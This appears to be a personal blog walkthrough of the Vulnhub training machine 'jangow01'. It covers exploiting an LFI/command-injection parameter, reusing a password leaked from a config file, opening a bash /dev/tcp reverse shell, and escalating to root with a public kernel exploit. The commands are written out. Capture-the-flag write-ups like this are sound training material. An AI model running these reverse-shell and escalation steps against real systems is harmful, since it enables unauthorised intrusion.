---
title: mat3uszm Vulnhub:jangow01
layout: default
---

# jangow01

Jangow is a vulnerable machine which I got from Vulnhub service. 

As always in my exploration I started from recon with checking all open ports and possible routes when port 80 is open. 

I found that port 80 and 21 are open so I can try to use ftp server and try to exploit web applications. 

I started from a web application and found that on `/site/busque.php?buscar=` route I could do LFI and command execution.

![screen1](/posts/jangow01/screen1.png)

So I tried to do more recon and maybe get more information and I found a config file with very interesting information. 

```
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
```

So with LFI and information I could try to reverse shell to web application. 

I tried to send a file to a server with a reverse shell in php but unfortunately I couldn’t send the file.

So I tried to make a bash technique to make reverse shell 

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

But to run it on server I had to encoded it in [URL encoder](https://www.urlencoder.io/) 

![screen2](/posts/jangow01/screen2.png)

And voila I had a reverse shell.

![screen3](/posts/jangow01/screen3.png)

To make reverse shell more friendly I used 

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
  
Right now I could check etc/passwd file and found the jangow01 user in the file.

I tried to login as jangow01 and use the password from the config file and login successfully.

With the same credential I could login to ftp server 

![screen4](/posts/jangow01/screen4.png)

So with shell and ftp server I could do everything I found that server is running on Ubuntu 16 so to privilege escalation I tried to use exploit for that OS. 

https://www.exploit-db.com/exploits/45010

![screen5](/posts/jangow01/screen5.png)

After compiling and sending a file with ftp to the server I could run exploit and read the root flag.  

I need to say that the root flag looks awesome ;) 

Happy hacking folks and good luck!

<style type="text/css">
    img {
        width: 55rem;
    }
</style> 
